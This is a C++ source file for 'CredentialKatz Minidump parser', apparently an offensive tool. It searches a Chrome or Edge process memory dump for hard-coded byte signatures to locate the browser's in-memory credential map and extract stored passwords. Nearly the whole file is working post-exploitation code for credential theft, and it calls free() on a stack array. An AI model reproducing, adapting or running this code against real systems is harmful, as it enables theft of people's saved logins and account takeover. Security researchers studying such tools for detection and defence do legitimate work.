#include "udmp-parser.h"

#define WIN32_LEAN_AND_MEAN 
#include <Windows.h>
#include <stdio.h>
#include "Helper.h"
#include "Memory.h"

void banner() { //This is important
	printf("  _____              _            _   _       _ _  __     _       \n");
	printf(" / ____|            | |          | | (_)     | | |/ /    | |      \n");
	printf("| |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | ' / __ _| |_ ____\n");
	printf("| |    | '__/ _ \\/ _` |/ _ \\ '_ \\| __| |/ _` | |  < / _` | __|_  /\n");
	printf("| |____| | |  __/ (_| |  __/ | | | |_| | (_| | | . \\ (_| | |_ / / \n");
	printf(" \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|_|\\_\\__,_|\\__/___|\n");
	printf("By Meckazin                                  github.com / Meckazin \n");
};

void usage() {
	wprintf(L"CredentialKatz Minidump parser\n");
	wprintf(L"Usage: \n");
	wprintf(L"    CredentialKatzMinidump.exe <Path_to_minidump_file>\n\n");
	wprintf(L"Example:\n");
	wprintf(L"    .\\CredentialKatzMinidump.exe .\\msedge.DMP\n\n");
	wprintf(L"You need to dump the Chrome/Edge main process.\n");
}

int main(int argc, char* argv[]) {

	banner();
	printf("Don't use your cat's name as a password!\n\n");

	if (argc <= 1) {
		usage();
		return EXIT_SUCCESS;
	}

	DWORD result = GetFileAttributesA(argv[1]);
	if (result == INVALID_FILE_ATTRIBUTES) {
		PrintErrorWithMessage(L"Could not find the dump file");
		return EXIT_FAILURE;
	}
	if (result != FILE_ATTRIBUTE_ARCHIVE) {
		wprintf(L"[-] File is not a minidump!\n");
		wprintf(L"    Attributes were: %d\n", result);
		return EXIT_FAILURE;
	}

	printf("[*] Trying to parse the file: %s\n", argv[1]);

	udmpparser::UserDumpParser dump;
	if (!dump.Parse(argv[1])) {
		printf("[-] Failed to parse file: %s\n", argv[1]);
		return EXIT_FAILURE;
	}

	LPCSTR dllName = "";
	size_t szPattern = 144;
	BYTE* pattern = 0;
	bool found = false;
	bool isChrome = true;

	const auto& Modules = dump.GetModules();
	for (const auto& [Base, ModuleInfo] : Modules) {
		if (ModuleInfo.ModuleName.find("chrome.exe") != std::string::npos) {
			printf("[*] Using Chrome configuration\n\n");
			dllName = "chrome.dll";
			pattern = new BYTE[144]{
				0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA,
				0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
				0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
				0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0xBB, 0x00,
				0x00, 0x00, 0x00, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0xAA, 0xD0, 0x48, 0x21, 0xD8, 0x48, 0x3B, 0x05,
				0xAA, 0xAA, 0x2E, 0x0B, 0x75, 0x08, 0x48, 0x89, 0xAA, 0xE8, 0xAA, 0xAA, 0xA3, 0xFD, 0x48, 0x8B,
				0x4E, 0x18, 0x48, 0x21, 0xCB, 0x48, 0x3B, 0x1D, 0xAA, 0xAA, 0x2E, 0x0B, 0x74, 0x20, 0x48, 0x89,
				0x7E, 0x18, 0xB9, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x03, 0x4E, 0x10, 0x48, 0x83, 0xC6, 0x08, 0x48,
				0x89, 0xF2, 0x48, 0x83, 0xAA, 0x20, 0x5B, 0x5F, 0x5E, 0xE9, 0xAA, 0xAA, 0x4D, 0xFE, 0xE8, 0xAA
			};
			found = true;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedge.exe") != std::string::npos) {
			printf("[*] Using MSEdge configuration\n\n");
			dllName = "msedge.dll";
			pattern = new BYTE[144]{
				0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA,
				0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
				0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x8A, 0x41,
				0x48, 0x3A, 0x42, 0x48, 0x75, 0x11, 0x84, 0xC0, 0x74, 0x22, 0x48, 0x89, 0xF1, 0x48, 0x83, 0xC4,
				0x20, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xAA, 0x84, 0xC0, 0x75, 0x17, 0x48, 0x85, 0xF6, 0x74, 0x20,
				0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0xC6, 0x46, 0x48, 0x01, 0x48, 0x83, 0xC4, 0x20,
				0x5E, 0xC3, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0xC6, 0x46, 0x48, 0x00, 0xEB, 0xEC,
				0x0F, 0x0B, 0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x38, 0x4D,
				0x89, 0xCE, 0x4C, 0x89, 0xC7, 0x48, 0x89, 0xD3, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA
			};
			found = true;
			isChrome = false;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedgewebview2.exe") != std::string::npos) {
			printf("[-] MSEdgeWebView is not currently supported!\n");
			return 1;

			//printf("[*] Using MSEdgeWebView configuration\n\n");
			//dllName = "msedge.dll";
			//pattern = new BYTE[144]{
			//	//empty
			//};
			//found = true;
			//isChrome = false;
			//break;
		}
	}

	if (!found) {
		printf("[-] The dump is from unsupported process\n");
		return EXIT_SUCCESS;
	}

	if (dump.GetArch() != udmpparser::ProcessorArch_t::AMD64) {
		printf("[-] Dump is not from x64 process!\n");
		return EXIT_SUCCESS;
	}

	BYTE secondPattern[sizeof(uintptr_t)];
	BYTE thirdPattern[sizeof(uintptr_t)];

	uintptr_t resultAddress = 0;
	if (!FindDLLPattern(dump, dllName, pattern, szPattern, resultAddress)) {
		printf("[-] Failed to find the first pattern!\n");
		return EXIT_SUCCESS;
	}
	printf("[*] Found the first pattern at: 0x%p\n", (void*)resultAddress);
	ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));

	if (!FindDLLPattern(dump, dllName, secondPattern, sizeof(uintptr_t), resultAddress)) {
		printf("[-] Failed to find the second pattern!\n");
		return EXIT_SUCCESS;
	}
	printf("[*] Found the second pattern at: 0x%p\n", (void*)resultAddress);
	ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));


	uintptr_t PasswordReuseDetectorInstances[100];
	size_t szPasswordReuseDetectorInstances = 0;

	if (!FindPattern(dump, thirdPattern, sizeof(uintptr_t), PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances)) {
		printf("[-] Failed to find the third pattern!\n");
		free(PasswordReuseDetectorInstances);
		return EXIT_SUCCESS;
	}
	
	printf("\n[*] Found %zu CredentialMap instances\n\n", szPasswordReuseDetectorInstances);

	for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
	{
		if (PasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
			break;
		uintptr_t CookieMapOffset = 0; //This offset is fixed since the data just is there like it is
		CookieMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
		wprintf(TEXT("[*] Found CredentialMap on 0x%p\n"), (void*)CookieMapOffset);
		WalkCredentialMap(dump, CookieMapOffset);
	}

	printf("[+] Done");

	return EXIT_SUCCESS;
}